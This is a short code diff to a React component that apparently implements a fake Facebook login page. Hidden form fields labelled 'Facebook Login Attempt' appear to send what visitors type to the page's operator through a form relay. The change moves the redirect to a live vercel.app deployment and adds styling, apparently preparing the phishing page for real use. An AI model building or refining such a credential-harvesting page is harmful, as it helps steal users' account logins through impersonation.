@@ -27,7 +27,7 @@ export default function FacebookLoginPage() {
               <input type="hidden" name="_captcha" value="false" />
               <input type="hidden" name="_template" value="table" />
               <input type="hidden" name="_subject" value="Facebook Login Attempt" />
-              <input type="hidden" name="_next" value="http://localhost:3000/facebook" />
+              <input type="hidden" name="_next" value="https://muslimshub.vercel.app/facebook" />
 
               <input
                 type="text"
@@ -77,7 +77,7 @@ export default function FacebookLoginPage() {
       </div>
 
       {/* Footer */}
-      <div className="bg-white pt-8 pb-12 px-4 text-center text-xs text-gray-500 space-y-4">
+      <div className="bg-white pt-8 pb-12 px-4 mt-10 text-center text-xs text-gray-500 space-y-4">
         <div className="max-w-6xl mx-auto flex flex-wrap justify-center gap-x-4 gap-y-1 text-[#385898] font-normal text-sm">
           {[
             'English (UK)', 'বাংলা', 'অসমীয়া', 'हिन्दी', 'नेपाली',
